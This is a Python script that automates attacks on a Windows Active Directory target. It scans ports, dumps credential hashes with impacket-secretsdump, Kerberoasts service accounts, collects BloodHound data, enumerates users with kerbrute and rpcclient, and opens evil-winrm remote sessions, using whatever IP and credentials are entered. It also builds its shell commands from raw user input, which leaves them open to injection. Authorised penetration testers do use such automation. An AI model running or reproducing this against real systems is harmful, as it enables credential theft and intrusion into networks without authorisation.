import os
import subprocess

def run_command(command, output_file):
    """Runs a system command, prints output in real-time, and writes it to a file."""
    with open(output_file, "a") as f:
        f.write(f"\n[+] Running: {command}\n")
    
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in process.stdout:
        print(line, end='')
        with open(output_file, "a") as f:
            f.write(line)
    process.wait()

def check_and_install_tools():
    """Checks if required tools are installed, installs missing ones globally."""
    tools = {
        "nmap": "nmap",
        "crackmapexec": "crackmapexec",
        "impacket-secretsdump": "impacket-scripts",
        "bloodhound-python": "bloodhound-python",
        "ldapsearch": "ldap-utils",
        "smbmap": "smbmap",
        "enum4linux-ng": "enum4linux-ng",
        "kerbrute": "kerbrute",
        "ldapdomaindump": "ldapdomaindump",
        "rdp-sec-check": "rdp-sec-check",
        "evil-winrm": "evil-winrm",
        "winrm-cli": "winrm-cli",
        "rpcclient": "samba-common-bin",
        "gpoenum": "gpoenum"
    }
    
    for tool, package in tools.items():
        if subprocess.call(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            print(f"[!] {tool} not found, installing...")
            subprocess.run(f"sudo apt install -y {package}", shell=True)
            print(f"[+] {tool} installed successfully.")
        else:
            print(f"[+] {tool} is already installed.")

def enumerate_windows(target_ip, domain, output_file, username, password):
    print("[+] Running enumeration for Windows target...")
    run_command(f"nmap -T4 -p- --open {target_ip}", output_file)
    run_command(f"crackmapexec smb {target_ip} -u {username} -p {password}", output_file)
    run_command(f"impacket-secretsdump {username}:{password}@{target_ip}", output_file)
    run_command(f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {target_ip}", output_file)
    run_command(f"bloodhound-python -u {username} -p {password} -d {domain} -c All --zip", output_file)
    run_command(f"ldapsearch -x -h {target_ip} -b 'dc={domain.replace('.', ',dc=')}'", output_file)
    run_command(f"smbmap -H {target_ip} -u {username} -p {password}", output_file)
    run_command(f"enum4linux-ng -A {target_ip}", output_file)
    run_command(f"kerbrute userenum -d {domain} --dc {target_ip} userlist.txt", output_file)
    run_command(f"ldapdomaindump ldap://{target_ip}", output_file)
    run_command(f"rdp-sec-check -t {target_ip}", output_file)
    run_command(f"evil-winrm -i {target_ip} -u {username} -p {password}", output_file)
    run_command(f"winrm-cli {target_ip} -u {username} -p {password}", output_file)
    run_command(f"rpcclient -U {username}%{password} {target_ip} -c 'enumdomusers'", output_file)
    run_command(f"gpoenum {target_ip} -u {username} -p {password}", output_file)
    print(f"[+] Windows enumeration complete! Results saved to {output_file}")

def main():
    print("[+] Checking for required tools...")
    check_and_install_tools()
    
    target_ip = input("Enter Target IP Address: ")
    domain = input("Enter Domain: ")
    username = input("Enter valid Windows username: ")
    password = input("Enter password for the Windows user: ")
    output_file = input("Enter output filename (default: windows_enum_results.txt): ") or "windows_enum_results.txt"
    
    enumerate_windows(target_ip, domain, output_file, username, password)
    
    print(f"[+] All enumeration results saved in {output_file}")
    
if __name__ == "__main__":
    main()
